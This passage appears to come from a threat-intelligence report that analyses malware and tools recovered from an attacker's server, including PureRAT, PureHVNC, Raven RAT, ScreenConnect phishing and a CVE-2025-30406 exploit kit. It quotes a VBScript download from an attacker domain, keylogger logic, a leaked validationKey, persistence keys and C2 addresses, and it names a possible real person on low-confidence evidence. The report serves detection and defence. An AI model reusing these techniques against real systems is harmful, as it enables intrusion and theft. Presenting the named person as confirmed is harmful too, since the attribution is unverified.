  <figcaption><em>Figure 4: Left — hex editor view of <code>config_raw.bin</code> (the GZip-decompressed ProtoBuf config blob from <code>Faidowra.dll</code>) showing <code>185.49.126.140</code> as plaintext in the raw bytes. Right — PowerShell ISE decoding the varint-encoded port values in the bytes immediately following the IP string. The script output confirms three sequential C2 ports: <code>56001</code>, <code>56002</code>, and <code>56003</code> — the complete C2 connection matrix for this build, extracted directly from the binary without any decryption key.</em></figcaption>
</figure>

**C2 Protocol Architecture:**
Raw TCP `\x04\x00\x00\x00` preamble → TLS (cert pinned to `CN=Ayzyqztcoa`) → 4-byte length-framed ProtoBuf messages. Approximately 84-type ProtoBuf discriminated union (published reports document 86 types — minor build-to-build variance). Random 20–40 second heartbeat interval — exact match to published behavioral signature (Derp.ca, Tier 3).

**Evidence Supporting HIGH Confidence (11 signatures matched):**


| Signature                                     | Source                                  |
| --------------------------------------------- | --------------------------------------- |
| Version string `"4.1.9"` in initial beacon    | Check Point Research (2025)             |
| 4-byte preamble `\x04\x00\x00\x00` before TLS | Netresec (Aug 2025)                     |
| C2 ports 56001/56002/56003                    | Netresec (Aug 2025)                     |
| Base64 → GZip → ProtoBuf config encoding      | Check Point Research, Fortinet, Derp.ca |
| TLS self-signed cert pinning                  | Check Point Research, Netresec          |
| `NotAfter: 9999-12-31`                        | Check Point Research, Netresec          |
| 4-byte little-endian length prefix            | Derp.ca                                 |
| ~84-type ProtoBuf union                       | Derp.ca (86 types — minor variance)     |
| 20–40 second random heartbeat                 | Derp.ca (exact match)                   |
| .NET Reactor 6.x obfuscation                  | Check Point Research, Fortinet          |
| Campaign tag defaulting to `"Default"`        | Derp.ca                                 |


**PureCoder Ecosystem Deployment:** Both PureRAT (full RAT, ports 56001–56003) and PureHVNC (HVNC-only stub `xh.exe`, port 8000) operate simultaneously, both connecting to `185.49.126.140`. The operator procured two separate PureCoder products and runs them in parallel.

**Why This Matters:** The TLS certificate `NotBefore` date of 2024-11-21 establishes that the PureRAT C2 has been operational since at least that date. The certificate was generated on a prior server (`185.49.126.97`) and migrated to `185.49.126.140`, confirming infrastructure was pre-staged before weaponization. The four-byte TCP preamble `\x04\x00\x00\x00` is an exceptionally reliable network detection signature — it appears on the wire before any TLS encryption and is not a standard protocol marker.

---

### 5d. PureHVNC — Hidden Desktop Control 

> **Plain language:** HVNC (Hidden Virtual Network Computing) creates an invisible second desktop on the victim's computer. The attacker can log into banking websites, cryptocurrency exchanges, and email accounts — all invisible to the victim. The victim sees their normal screen; the attacker is operating silently in a hidden session.

**Confidence:** DEFINITE (`PureRAT.exe` internal name `PureHVNC_GUI` confirmed from config file; `xh.exe` C2 address hardcoded)

**Components:**

- `PureRAT.exe` (82.9MB) — PureHVNC operator GUI (PureBasic outer shell, BoxedApp SDK virtual filesystem, DNGuard inner protection). The 75.9MB `.rsrc` section contains a virtual filesystem. Internal name: `PureHVNC_GUI`.
- `xh.exe` (62,464 bytes) — VB.NET victim stub; C2 hardcoded to `185.49.126.140:8000`; references internal component `PHVNC.exe`

BoxedApp SDK is a commercial virtual filesystem toolkit that bundles multiple executables and assets into a single binary. DNGuard is a .NET obfuscation/protection product.

**Why This Matters:** HVNC is among the most dangerous capabilities in this toolkit from a financial loss perspective. Standard screen sharing and remote monitoring tools are visible to the user. HVNC bypasses this entirely. The operator opens a Chrome browser session in the hidden desktop, logs into financial services, and transfers funds — all while the victim continues to work normally on their visible desktop. Most endpoint detection solutions do not flag this activity because the hidden desktop operates as a legitimate Windows component.

<figure style="text-align: center; margin: 2em 0;">
  <img src="{{ "/assets/images/OpenDirectory-74.0.42.25/xh_exe.png" | relative_url }}" alt="Decompiled xh.exe PureHVNC stub showing hardcoded C2 IP 185.49.126.140 and HVNC.StartHVNC call">
  <figcaption><em>Figure 5: Decompiled <code>xh.exe</code> (the PureHVNC victim stub) with the hardcoded C2 address <code>185.49.126.140</code> highlighted. The same IP appears hardcoded across three separate binaries from different malware families — XWorm (port 5000), PureRAT (ports 56001–56003), and PureHVNC (port 8000) — directly confirming a single operator controls all three families through one consolidated C2 server. The <code>HVNC.StartHVNC()</code> call initiates the hidden desktop session using those hardcoded parameters.</em></figcaption>
</figure>

---

### 5e. Raven RAT — Custom Delphi C2 

> **Plain language:** Raven RAT is a custom hacking tool the operator appears to have built themselves, using the Delphi programming language. It is not yet finished — the README says it is about 60% complete. Despite being incomplete, it already has keylogging, hidden desktop control, cryptocurrency wallet theft, and remote shell capabilities.

**Confidence:** DEFINITE (full source code recovered from open directory; operator panel `vicTest.exe` accidentally uploaded)

**Language:** Embarcadero Delphi 12.0 Athens Enterprise (commercial IDE; requires purchase)

**Confirmed Capabilities (from source code + binary decompilation):**

- System survey beacon (opcode `0x49`) — hardware and software inventory
- Keylogger — `GetAsyncKeyState(0x0D/0x01)` polling on Enter key and left mouse click
  > **Important distinction:** This is a form-submission keylogger, not a full keystroke capture. It fires only on Enter key release (form submit) and left mouse button release (button click), then flushes whatever was typed into the accumulation buffer. Decompiled `TOThread.Execute` loop (Binary Ninja HLIL):
  >
  > ```
  > while not TThread.Terminated:
  >   if GetAsyncKeyState(0x0D) != 0:       // Enter key down
  >     spin until Enter released
  >     if keystroke_buffer != empty:
  >       sub_6baa88(keystroke_buffer)       // send buffer to C2
  >     clear_buffer()
  >   if GetAsyncKeyState(0x01) != 0:       // Left mouse button down
  >     spin until button released
  >     if keystroke_buffer != empty:
  >       sub_6baa88(keystroke_buffer)       // send buffer to C2
  >     clear_buffer()
  >   sleep(1)
  > ```
  >
  > This implementation avoids `SetWindowsHookEx WH_KEYBOARD_LL` — a commonly monitored API. `GetAsyncKeyState` is used legitimately by games and accessibility tools, generating no hook-registration events for security tools to observe.
- Process manager — kills processes via `taskkill /f /im [name]` via `CreateProcessW(CREATE_NO_WINDOW)`
- Remote shell — `CreateProcessW`
- File upload and execute — opcode `0x55`: writes to `%TEMP%` via `GetTempPathW`, executes
- Screenshot capture — on-demand PNG via GDI+ (PNG level 7 compression)
- Hidden VNC (`THiddenVNC`/`THiddenVNCThread`/`THVNCInputThread`) via `CreateDesktop()`: creates isolated hidden Windows desktop; delta framing for bandwidth efficiency; callback port 6968
- **Cryptocurrency wallet theft** — four named TEdit (form field) targets: **Exodus, Atomic Wallet, Guarda, Wasabi**
- Persistence — writes `SOFTWARE\Microsoft\Windows\CurrentVersion\Run` key, value name `WindowsService`
- SOCKS proxy — full `TIdSocksInfo` implementation
- SSL/TLS — `TIdSSLIOHandlerSocketBase` compiled in

**HVNC Implementation (from `HVNC.pas` source):**
Creates a hidden Windows desktop via `CreateDesktop()` with `GENERIC_ALL` access. Chrome is launched into the hidden desktop with all rendering acceleration disabled to ensure compatibility in the off-screen context:

```
cmd.exe /c "start /max chrome.exe --no-sandbox --allow-no-sandbox-job
  --disable-3d-apis --disable-gpu --disable-d3d11"
```

Delta framing transmits only changed screen regions. Input relay accepts `0x69` (keystroke via `WM_KEYDOWN`), `0x71` (mouse click via `WM_LBUTTONDOWN/UP`), `0x67` (full frame request). Callback port `6968`. Requires Python 3.9.0 with Flask, requests, waitress for the relay server component.

**Operator C2 Panel — `vicTest.exe` (Accidentally Uploaded):**

- Caption: `Raven Loader`; panel build date: `04-13-2025`
- Server listen port: `8777`; HVNC callback port: `6968`
- Operator handle: `Steffz` (hardcoded — "Welcome Back Steffz!")
- About section credits: `ZeroTrace / NeverTrace`
- **Operator real name recovered:** `Stefan Yosifov` — recovered from `pdf:Author` XMP metadata embedded in `Main.dfm` source file (Canva account `UAGcXl67Or4`, document `DAGlzS2GcRU`, design title `Raven Botnet - 1`)

<figure style="text-align: center; margin: 2em 0;">
  <img src="{{ "/assets/images/OpenDirectory-74.0.42.25/raven_loader_caption.png" | relative_url }}" alt="Main.dfm source from vicTest.exe showing Caption = 'Raven Loader' at line 7">
  <figcaption><em>Figure 6: <code>Main.dfm</code> source from <code>vicTest.exe</code> — the accidentally uploaded Raven RAT operator panel. The window title <code>'Raven Loader'</code> at line 7 confirms this is the operator's own C2 control interface, not a victim stub.</em></figcaption>
</figure>

<figure style="text-align: center; margin: 2em 0;">
  <img src="{{ "/assets/images/OpenDirectory-74.0.42.25/operator_handle.png" | relative_url }}" alt="Main.dfm source showing Caption = 'Welcome Back Steffz!' hardcoded in the C2 panel">
  <figcaption><em>Figure 7: <code>Main.dfm</code> source confirming the operator's handle — <code>'Welcome Back Steffz!'</code> hardcoded as a UI label in the C2 panel. This is DEFINITE-confidence identity evidence: the string is embedded in the panel's own source code, not extracted from a log or metadata field.</em></figcaption>
</figure>

<figure style="text-align: center; margin: 2em 0;">
  <img src="{{ "/assets/images/OpenDirectory-74.0.42.25/Zerotrace.png" | relative_url }}" alt="Main.dfm source showing Caption = 'Author ~ ZeroTrace / NeverTrace' in the About panel">
  <figcaption><em>Figure 8: <code>Main.dfm</code> source showing the About panel caption <code>'Author ~ ZeroTrace / NeverTrace'</code> — the threat actor's self-identified brand embedded directly in the Raven RAT operator panel source code. This corroborates the ZeroTrace attribution recovered independently by CYFIRMA.</em></figcaption>
</figure>

> **Important caveat on "Stefan Yosifov":** This name is the value of the `pdf:Author` XMP field in the Canva account that created the Raven RAT logo. Delphi strips this metadata during compilation — it appears in the source file only, not in the compiled binary. This represents a lead for further investigation, not confirmed attribution to a real person. Confidence for this as a real-world identity: LOW — single source, no independent corroboration found in accessible OSINT.

<figure style="text-align: center; margin: 2em 0;">
  <img src="{{ "/assets/images/OpenDirectory-74.0.42.25/author.png" | relative_url }}" alt="XMP metadata extraction output showing pdf:Author Stefan Yosifov and Canva document details">
  <figcaption><em>Figure 9: XMP metadata extracted from the PNG logo embedded in <code>Main.dfm</code>. The <code>pdf:Author</code> field value <code>Stefan Yosifov</code>, Canva document <code>DAGlzS2GcRU</code>, and user account <code>UAGcXl67Or4</code> are confirmed artifact values. The document title <code>'Raven Botnet - 1'</code> confirms this logo was created specifically for the Raven RAT project. Real-world identity confidence: LOW — single source, no independent corroboration.</em></figcaption>
</figure>

**Why This Matters:** The accidental upload of the operator's C2 panel is the single biggest intelligence windfall in this campaign. It exposes the server architecture, the operator's handle, the product branding, and embedded metadata leading to a Canva account. The use of a commercial Delphi IDE (Delphi 12.0 Athens Enterprise) indicates financial investment in development tooling, which is more consistent with a financially motivated individual than with a casual actor using free tools.

---

### 5f. ConnectWise ScreenConnect Abuse

> **Plain language:** ConnectWise ScreenConnect is a legitimate IT remote support tool used by help desks worldwide. The attacker is abusing it — tricking victims into installing it under a fake domain, giving the attacker persistent remote control through a tool that most security products deliberately allow through.

**Confidence:** DEFINITE (DomainTools Iris HTTP server header confirmed on both operator domains; `Attachment.vbs` delivery chain fully analyzed; 500 pre-generated session links recovered)

**Why ScreenConnect was chosen:**

- Legitimately Authenticode-signed — passes binary reputation checks
- Classified as remote support software, not malware, by most antivirus/EDR solutions
- Permitted through corporate firewalls and allow-listed in many security policies
- No user interaction required once installed silently

**Delivery Chain — `Attachment.vbs` (SHA256: `fdca9ee6e64d67795cd48c5740fa54f509b00bff3e2e94d5f7863e21b23da7f6`, 2,187 bytes):**

1. VBScript requests UAC elevation via `Shell.Application.ShellExecute` with `runas` verb
2. Downloads ScreenConnect MSI using `MSXML2.ServerXMLHTTP.6.0` with SSL certificate validation deliberately bypassed:
  ```vbscript
   oHTTP.setOption 2, 13056  ' 0x3300 — disables SSL cert validation entirely
   oHTTP.Open "GET", "https://chainconnects[.]net/Bin/support.ClientSetup.msi?e=Access&y=Guest", False
   oHTTP.Send
  ```
3. Silent install: `msiexec /i [msi] /quiet ALLUSERS=2`
4. Downloads and opens a real Social Security Administration PDF as victim decoy
5. Writes debug log to `%TEMP%\test_debug.txt` (OPSEC failure — timestamps and HTTP status codes visible to forensic analysts)

**500 Pre-Generated Session Links (`final_links.txt`):**
Generated by `screen.py` (author: `@rockbelling`) via Chrome automation (Playwright) using the operator's admin panel. Each link contains a unique UUID session identifier. Critically, all 500 links share the same static RSA public key (2048-bit, documented in Section 10 investigation guidance), confirming single-operator deployment. These links are ready for distribution via phishing, SMS, or social engineering and have not been used yet as of discovery.

**Why This Matters:** The combination of a legitimate signed installer, a decoy document, and a real domain name (`chainconnects[.]net` — note: mimics "ConnectWise ScreenConnect") makes this delivery chain highly effective against users with basic security awareness training. The `?e=Access&y=Guest` URL parameter pattern is consistent with documented ScreenConnect phishing campaigns using the Access+Guest session mode to allow unattended access.

---

### 5g. CVE-2025-30406 Exploit Kit

> **Plain language:** CVE-2025-30406 is a critical security flaw in web servers running Microsoft's ASP.NET framework where attackers who know a secret configuration value can execute arbitrary commands on the server. This operator has a pre-built exploit kit targeting a specific named web application — meaning they have already obtained the secret configuration file from the target.

**Confidence:** HIGH (CISA KEV catalog — Tier 1; Huntress documentation — Tier 2; Stage 1 technical analysis confirmed exploit structure and hardcoded victim-specific values)

**CVE Summary:** CVSS 9.0. Affects Gladinet CentreStack and Triofox, and more broadly any ASP.NET application where an attacker has obtained the `machineKey` configuration values. Added to CISA KEV April 2025. Exploited as a zero-day before patch release.

**Components Found:**

- `exploit.py` — Python exploit script
- `ysoserial.exe` (SHA256: `3b62ba4040d0d470521dce089c13cd8491d1463acbcc8391a49923caa02c08e9`) — public .NET deserialization exploit generator (GitHub: `pwntester/ysoserial.net`)
- `server.py` — HTTP listener to receive command output
- `sctt.py` — auxiliary script
- `README (2).md` — operator documentation

**Hardcoded Victim-Specific Values:**

```
validationKey: 5496832242CC3228E292EEFFCDA089149D789E0C4D7C1A5D02BC542F7C6279BE9DD770C9EDD5D67C66B7E621411D3E57EA181BBF89FD21957DCDDFACFD926E16
generator:     3FE2630A (path-derived — unique to one deployed application instance)
algorithm:     HMACSHA256
gadget chain:  TextFormattingRunProperties (.NET WPF deserialization)
```

**Exploitation Mechanism:**
The `generator` value `3FE2630A` is derived from the application's physical path on disk — it is mathematically unique to a single deployed application instance. Its presence in the exploit kit confirms the operator previously obtained the target's `web.config` file. This is a targeted follow-on attack against a partially compromised system, not opportunistic mass exploitation.

The `TextFormattingRunProperties` gadget chain targets `Microsoft.VisualStudio.Text.Formatting.TextFormattingRunProperties`, which implements `ISerializable`. A malicious XAML payload in the `ForegroundBrush` property is parsed by `XamlReader.Parse()`, triggering `System.Diagnostics.Process.Start()` with attacker-controlled arguments — arbitrary OS command execution in the IIS worker process context.

**Important Distinction:** This exploit kit is NOT the Gladinet CentreStack mass-exploitation variant associated with the CL0P ransomware group (per Huntress reporting). The custom `generator` value confirms a non-Gladinet, non-mass-exploitation target. No overlap with CL0P TTPs or infrastructure was identified.

---

### 5h. BAK3R Office 365 Credential Cracker

> **Plain language:** BAK3R is a tool that automatically tests stolen username/password combinations against Microsoft Office 365 email servers. Valid credentials are captured for the attacker to use in email fraud or further network access.

**Confidence:** DEFINITE (script recovered; `BAD-BAK3R.txt` confirms 58 recent failed O365 attempts on the server)

**Author attribution (from `Office_Cracker.py` source):** Telegram `@BAK34_TMW`; Discord `825505380452925470`

**Functionality:**

- Target: `smtp.office365.com:587` (SMTP AUTH / Microsoft 365)
- 25 concurrent threads; SMTP EHLO → STARTTLS → AUTH LOGIN per attempt
- On success: uses the compromised account itself to notify operator via email; writes to `LIVE-BAK3R.txt`
- Failed attempts logged to `BAD-BAK3R.txt`

**Evidence of Active Use:** `BAD-BAK3R.txt` containing 58 failed O365 authentication attempts was present on the server, confirming BAK3R has been actively run against the 9.1M credential database.

---

### 5i. PowerShell Fileless Droppers

> **Plain language:** Two PowerShell scripts (`puf.ps1` and `sync.ps1`) hide a full malware program inside themselves as encoded text. When run, they decode and execute the malware entirely in memory — nothing gets written to the hard drive, making standard antivirus scanning ineffective.

**Confidence:** DEFINITE (scripts recovered and analyzed; MODERATE confidence they deliver an Aspdkzb-family payload based on size correlation)

**Files:** `puf.ps1` (689KB) and `sync.ps1` (671KB) — structurally identical 197-line fileless PE droppers

**Anti-analysis:** 13 levels of nested `Try{} Catch{}` blocks — makes automated parsing and emulation-based detection significantly harder

**Mechanism:**

1. Core function `onyx` hex-decodes the embedded PE (`$gsod` holds MZ/DOS header `4D5A9000...`)
2. Embedded PE: 32-bit .NET assembly (~310KB), sections `.text`, `.rsrc`, `.reloc`
3. `[System.Reflection.Assembly]::Load($bytes)` — in-memory execution, no disk write
4. Two different builds: `puf.ps1` PE timestamp `8FB8A667`; `sync.ps1` PE timestamp `AF4EE2DB`

**Size correlation to Aspdkzb cluster:** The decoded PE size (~310KB) correlates with the Aspdkzb Stage 1 files (312–325KB) — MODERATE confidence these droppers deliver the same loader family.

---

### 5j. vlc_boxed.exe — DGA-Capable Unknown Family

> **Plain language:** This file pretends to be a VLC media player component. It has a built-in domain name generator — it automatically creates website addresses to contact for instructions, making it hard to block. The actual malware inside has not been fully identified.

**Confidence:** HIGH for DGA behavior (dynamically confirmed); INSUFFICIENT for inner payload family identification (Enigma Virtual Box protection prevents static analysis; family unidentified)

**File:** `vlc_boxed.exe` | SHA256: `7a848e3509c5945f1104c0baa89032ac6e329a84844ca6bf4177b9308d98b2d3` | 10.3MB | MSVC 14.41 (VS 2022) + Enigma Virtual Box wrapper

**Dynamic Analysis Findings (behavioral sandbox — Noriben):**

- T+1s: Anti-analysis probe — opened `%UserProfile%\.MalwareAnalysis\Scripts\Noriben\dll_log.txt` — environment-aware; confirmed sandbox detection capability (DEFINITE)
- T+1s: Persistence established — `HKCU\Software\Microsoft\Windows\CurrentVersion\Run\vlctask = %APPDATA%\vlcapp\vlc.exe`
- Target binary `%APPDATA%\vlcapp\vlc.exe` NOT dropped — C2 gating; payload requires successful C2 contact before download
- DNS queries via `svchost.exe` (Windows DNS Client) to FakeNet listener — DGA domains not captured in FakeNet logs; PCAP (`packets_20260314_221202.pcap`) available for future extraction
- 8 virtual filesystem components extracted by Enigma VB at runtime: sizes 116KB, 184KB, 208KB, 460KB, 516KB, 1.7MB, **4.7MB** (`evb3489.tmp` — primary payload module candidate)
- Process survived full 300-second analysis window; 2 threads only; no child processes

**Analysis Gap:** The 4.7MB `evb3489.tmp` component requires unpacking in an isolated VM to identify the inner payload family. DGA domain names not captured — PCAP extraction recommended.

Noriben is a behavioral sandbox (process monitor tool) used for initial behavioral analysis. Enigma Virtual Box is a commercial application virtualization tool.

---

## 6. Attack Chain Reconstruction — Kill Chain

> **Plain language:** This section shows how the attacker moves from sending a phishing email to having full control of a victim's computer, step by step. Three different attack paths are documented.

### Phase 1: Initial Access — Three Parallel Vectors

> **Plain language:** The attacker has three different ways to get into a victim's system, all running at the same time. Most victims will encounter the phishing email approach.

**Vector A — Email Phishing via VBScript (ScreenConnect):**
Victim receives phishing email with `Attachment.vbs` → user double-clicks → Windows UAC prompt appears → user approves → `Attachment.vbs` silently downloads ScreenConnect MSI from `chainconnects[.]net/Bin/support.ClientSetup.msi?e=Access&y=Guest` (SSL validation deliberately bypassed) → `msiexec /i [msi] /quiet ALLUSERS=2` installs silently → ScreenConnect connects to `adminxyzhosting[.]com:8041` → SSA PDF decoy opens to distract victim → operator has persistent GUI remote access.

**Vector B — Bulk Phishing Link Distribution (ScreenConnect):**
`screen.py` (run from operator's Windows Administrator session) automates Chrome via Playwright to bulk-generate 500 unique ScreenConnect session links → links distributed via phishing email, SMS, or social engineering → victim clicks link → `Update.Client.exe` downloads from `adminxyzhosting[.]com` → connects to relay → operator has persistent access.

**Vector C — Server-Side Exploitation (CVE-2025-30406):**
Operator possesses victim web server's `web.config` (from prior access) → `exploit.py` + `ysoserial.exe` generates HMACSHA256-signed ViewState payload using stolen `validationKey` and path-derived `generator 3FE2630A` → HTTP POST to vulnerable ASP.NET endpoint → server deserializes payload → `TextFormattingRunProperties` gadget triggers `XamlReader.Parse()` → arbitrary OS command executes → output exfiltrated to `server.py` HTTP listener → full RCE on web server with IIS worker process privileges.

---

### Phase 2: Payload Staging (Post-Initial-Access)

> **Plain language:** After gaining initial access (usually via ScreenConnect), the attacker runs a PowerShell script to load additional malware entirely in memory — no files written to disk.

Once initial access is established (ScreenConnect or CVE RCE):

**Step 1:** `puf.ps1` or `sync.ps1` executed via remote shell
**Step 2:** PowerShell decodes hex-embedded PE entirely in memory (13 levels of nested anti-analysis wrappers)
**Step 3:** `[System.Reflection.Assembly]::Load($bytes)` — .NET assembly executed from memory
**Step 4:** Aspdkzb Stage 1 executes → AES-256+GZip decrypt → `Assembly.Load()` → Zvafsyattl Stage 2 in memory
**Step 5:** TEA cipher decrypt → `Assembly.Load()` → Faidowra.dll Stage 3 in memory
**Step 6:** PureRAT v4.1.9 initializes, connects to `185.49.126.140:56001` (or 56002/56003 on retry)

---

### Phase 3: RAT Deployment and Persistence

> **Plain language:** The attacker deploys multiple remote access tools to the victim, ensuring that even if one is detected and removed, the others maintain access. Registry persistence entries ensure the malware survives reboots.

**XWorm path:**
`XwormLoader.exe` → 11-stage reflective load (no disk write) → XWorm .NET stub active in memory → connects `185.49.126.140:5000` → full RAT active (keylogger, screenshot, credentials, HVNC, proxy, ransomware on-demand)

**Raven RAT path (when operator chooses to deploy):**
Operator runs `vicTest.exe` on their server (port 8777 listener) → compiled victim stub deployed to target → victim stub connects to `[operator IP]:8777` → HVNC creates hidden Windows desktop → Chrome launched in hidden session with no-sandbox flags → operator controls browser session invisibly

**Persistence mechanisms installed:**

- `HKCU\SOFTWARE\XWorm` — XWorm runtime configuration storage
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Run\vlctask = %APPDATA%\vlcapp\vlc.exe` (vlc_boxed.exe)
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsService` (Raven RAT)
- ScreenConnect service installed as legitimate remote support software (persists as Windows service)

---

### Phase 4: Credential Harvesting and Fraud

> **Plain language:** Once the attacker has access and persistence, they collect credentials and commit financial fraud using four different channels simultaneously.

- **XWorm keylogger:** Captures all keystrokes → transmitted to C2 every beacon cycle
- **XWorm `RunRecovery` plugin:** Extracts saved browser passwords and stored credentials
- **BAK3R cracker:** Tests 9.1M combo list against `smtp.office365.com:587` → valid O365 accounts → BEC capability, further network access
- **PureHVNC hidden browser session:** Operator logs into banking/crypto/email accounts in hidden desktop — invisible to victim
- **Raven RAT wallet theft:** Four named TEdit form fields target Exodus, Atomic Wallet, Guarda, and Wasabi cryptocurrency wallets
- **XWorm Clipper:** Monitors clipboard; replaces any BTC, ETH, or TRC20 address with operator's wallet address → all cryptocurrency transactions silently redirected

---

## 7. Threat Intelligence Context

> **Plain language:** This section puts the specific tools found in this campaign into broader context — what is publicly known about each tool's history and the attack techniques used.

### XWorm V5.6 Landscape Context

XWorm was first documented in July 2022 (developer handle "XCoder"). Version 5.6 was the final officially released version before the developer ceased operations in late 2024. Cracked copies of V5.6 subsequently proliferated across underground forums, significantly lowering the deployment skill threshold. A CloudSEK (Tier 2) report documented over 18,000 device compromises from a trojanized version of the V5.6 builder distributed to inexperienced actors. As of 2025–2026, XWorm V5.6 is among the most frequently detected commodity RAT families globally, per Cofense and Trellix (Tier 2) reporting.

The V5.6 sample in this campaign is consistent with the widely circulating cracked builder version. Port 5000 is operator-configured (not a default) — not a meaningful distinguishing indicator.

**XWorm end-of-life implication:** No security updates exist for V5.6. The builder and stubs are static. Any XWorm V5.6 detection should be treated as a commodity cracked tool, not a targeted nation-state capability.
(Confidence: HIGH — Tier 2: CloudSEK, Trellix, Cofense)

### PureRAT / ResolverRAT Landscape Context

The developer operates as "PureCoder" and offers PureRAT as a subscription product. The broader PureCoder ecosystem includes PureCrypter (obfuscator) and PureLogs (info-stealer). Morphisec researchers coined the name "ResolverRAT" in April 2025 for the same codebase. PureRAT activity was documented as significantly elevated through 2025, with targeting including healthcare and pharmaceutical sectors (Morphisec/Check Point Research, Tier 2), hospitality, and Russian enterprises. The version confirmed in this campaign (v4.1.9) matches all technical signatures published by Netresec (August 2025) and Check Point Research (2025).
(Confidence: MODERATE for growth figures — vendor-reported; HIGH for version identification — 11 technical signatures matched)

### ConnectWise ScreenConnect Abuse Context

ScreenConnect emerged as a frequently abused legitimate remote access tool in 2024–2025, documented across campaigns spoofing the US Social Security Administration (SSA), invoice-themed phishing, and fake IT support lures (CyberProof, Tier 2). The SSA-themed decoy PDF in `Attachment.vbs` is consistent with documented SSA impersonation patterns. The `/Bin/` directory download path and `?e=Access&y=Guest` URL parameter pattern are exact structural matches to documented ScreenConnect phishing campaigns.

ScreenConnect version 23.2.9 predates the February 2024 "SlashAndGrab" vulnerabilities (CVE-2024-1709 authentication bypass and CVE-2024-1708 path traversal RCE). These vulnerabilities are separate from the abuse pattern here — the actor is abusing ScreenConnect for legitimate remote access, not exploiting ScreenConnect server-side.
(Confidence: HIGH — Tier 2: CyberProof; Tier 1 for CVE-2024-1709/1708)

### CVE-2025-30406 — Contextual Note

CVE-2025-30406 (CVSS 9.0) was added to the CISA Known Exploited Vulnerabilities catalog in April 2025 (Tier 1). Huntress researchers documented at least seven distinct organization compromises via this vulnerability. The CL0P ransomware group exploited it in mass campaigns against Gladinet CentreStack. The exploit kit in this campaign is a different, targeted adaptation against a non-Gladinet ASP.NET application — confirmed by the custom `generator` value `3FE2630A`, which is path-derived and unique to a single application instance. No CL0P infrastructure or TTP overlap was identified.
(Confidence: HIGH — Tier 1: CISA KEV; Tier 2: Huntress; HIGH for differentiation from CL0P)

### ZeroTrace / Raven RAT Operator Context

CYFIRMA (Tier 2) independently documented the ZeroTrace Team in 2025, confirming the Telegram handle `@ZeroTraceDevOfficial`, GitHub account `monroe31s`, and the handle `steffz` as artifacts in the ZeroTrace tool portfolio (specifically in Octalyn Stealer builder strings: `$name2 = "steffz"`). This cross-tool corroboration strengthens the linkage between the Raven RAT panel operator and the ZeroTrace development operation. CYFIRMA's coverage is of the Raven Stealer product line (a separate C++ infostealer); the Raven RAT (Delphi-based interactive C2 RAT) found in this campaign represents a separate, undocumented product in the ZeroTrace portfolio.
(Confidence: HIGH — Tier 2: CYFIRMA)

---

## 8. Threat Actor Assessment — ZeroTrace

> **Plain language:** This section describes what is known about who is behind this operation. The operator's digital identity (Telegram handle @ZeroTraceDevOfficial, GitHub account monroe31s) is recovered directly from malware artifacts. A Tier 2 threat intelligence vendor independently confirms these identifiers across multiple tools in the ZeroTrace portfolio. Real-world identity remains unverified.

**Threat Actor:** ZeroTrace
**Confidence:** HIGH (88%) — operating identity
**Confidence:** MODERATE (72%) — full campaign scope

- **Why HIGH for operating identity:** `@ZeroTraceDevOfficial` recovered directly from Raven RAT component artifacts; GitHub repository `monroe31s/Raven-RAT` is the confirmed source of the Raven RAT component; CYFIRMA (Tier 2) independently confirms these identifiers as ZeroTrace Team in "Raven Stealer Unmasked" (2025). Two converging independent evidence streams.
- **Why MODERATE for full campaign scope:** CYFIRMA's coverage is specific to Raven Stealer/Raven RAT. ZeroTrace's direct involvement in the XWorm V5.6 and PureRAT components of this operation is inferred from infrastructure co-location and operational pattern, not independently confirmed for each family.
- **What would increase confidence:** Additional Tier 2 vendor attribution linking ZeroTrace to XWorm or PureRAT deployment; Telegram OSINT on @ZeroTraceDevOfficial channel; independent corroboration of Stefan Yosifov real-world identity.

### Digital Identity Artifacts


| Artifact                          | Value                                        | Source                                                                        | Confidence                                |
| --------------------------------- | -------------------------------------------- | ----------------------------------------------------------------------------- | ----------------------------------------- |
| Operator handle                   | Steffz                                       | Raven RAT C2 panel — "Welcome Back Steffz!" hardcoded in DFM                  | DEFINITE                                  |
| Telegram channel                  | @ZeroTraceDevOfficial                        | README.md in Raven RAT source; CYFIRMA independent corroboration              | HIGH                                      |
| GitHub account                    | monroe31s (ZDev)                             | CYFIRMA confirmed; Raven-RAT repository; 7 stars, 5 forks; created 2025-05-01 | HIGH                                      |
| Canva account name (XMP metadata) | Stefan Yosifov                               | Main.dfm XMP metadata (source file, not compiled binary)                      | LOW (real-world identity — single source) |
| Canva user/document ID            | UAGcXl67Or4 / DAGlzS2GcRU                    | Main.dfm XMP metadata                                                         | DEFINITE (artifact value)                 |
| Panel build date                  | 2025-04-13                                   | vicTest.exe binary metadata                                                   | DEFINITE                                  |
| Compiler                          | Embarcadero Delphi 12.0 Athens Enterprise    | Binary PE headers (commercial IDE)                                            | HIGH                                      |
| steffz handle in separate tool    | $name2 = "steffz" in Octalyn Stealer builder | CYFIRMA independent research                                                  | HIGH                                      |
| BAK3R tool author                 | @BAK34_TMW (Telegram)                        | Office_Cracker.py source attribution                                          | DEFINITE (attribution string)             |
| ScreenConnect script author       | @rockbelling                                 | screen.py comment header                                                      | DEFINITE (attribution string)             |


<figure style="text-align: center; margin: 2em 0;">
  <img src="{{ "/assets/images/OpenDirectory-74.0.42.25/telegram_handle_AI.png" | relative_url }}" alt="Raven RAT README.md showing @ZeroTraceDevOfficial Telegram link at line 10">
  <figcaption><em>Figure 10: <code>README.md</code> recovered from the Raven RAT source directory on the open directory server. The <code>@ZeroTraceDevOfficial</code> Telegram link at line 10 is the primary digital identity anchor for ZeroTrace — independently corroborated by CYFIRMA. The feature list confirms all capabilities documented through binary analysis: HVNC, keylogger, process manager, and cryptocurrency wallet theft.</em></figcaption>
</figure>

### Operator Profile

**Actor type:** Individual operator or small team (maximum 2–3 persons based on tool diversification and OPSEC failure rate)

**Role in ecosystem:**

- Self-identified developer of Raven RAT (ZeroTrace portfolio; tool approximately 60% complete)
- MaaS consumer for XWorm V5.6 (cracked builder), PureRAT v4.1.9 (subscription product), BAK3R tool (Telegram distributor), ConnectWise ScreenConnect (legitimate software abused)
- Credential database aggregator (procured from Telegram data broker `@ddandt02` per footer in `Corp_202M.txt`)
- CVE-2025-30406 exploit operator (adapted from public `ysoserial.net` tooling against a specific target)

